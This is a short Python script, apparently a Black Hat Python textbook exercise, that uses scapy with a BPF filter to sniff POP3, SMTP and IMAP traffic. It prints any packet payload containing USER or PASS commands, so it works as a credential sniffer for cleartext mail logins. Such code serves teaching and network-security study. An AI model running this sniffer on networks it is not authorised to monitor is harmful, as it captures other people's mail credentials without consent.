#!/usr/bin/env python
# encoding: utf-8
"""
@file: bpf_demo.py
@time: 2022/5/23 20:54
@project: black-hat-python-2ed
@desc: P67 BPF示例
"""
from scapy.layers.inet import TCP, IP
from scapy.sendrecv import sniff


def packet_callback(packet):
    # 检查有没有数据载荷
    if packet[TCP].payload:
        mypacket = str(packet[TCP].payload)
        # 检查数据载荷中有没有USER和PASS两条邮件协议命令
        if 'user' in mypacket.lower() or 'pass' in mypacket.lower():
            print(f"[*] Destination: {packet[IP].dst}")
            print(f"[*] {str(packet[TCP].payload)}")


def main():
    # 监听常用邮件协议端口上接收的流量，不会将任何数据包保留在内存中
    sniff(filter='tcp port 110 or tcp port 25 or tcp port 143', prn=packet_callback, store=0)


if __name__ == '__main__':
    main()
